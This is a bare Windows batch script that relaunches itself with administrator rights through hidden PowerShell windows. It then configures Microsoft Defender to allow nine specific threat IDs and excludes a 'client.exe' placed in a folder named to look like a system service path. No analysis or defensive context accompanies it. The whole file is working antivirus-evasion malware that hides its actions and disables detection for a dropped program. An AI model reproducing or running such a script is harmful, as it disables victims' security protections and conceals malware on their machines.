call :Admin

START Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147685180 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147735507 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147736914 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147743522 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147734094 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147743421 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 251873 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 213927 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ThreatIDDefaultAction_Ids 2147722906 -ThreatIDDefaultAction_Actions Allow -Force; ^
Add-MpPreference -ExclusionPath C:\ProgramData\Microsoft\WwanSvc\Profiles\client.exe -Force;

:Admin
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit
)









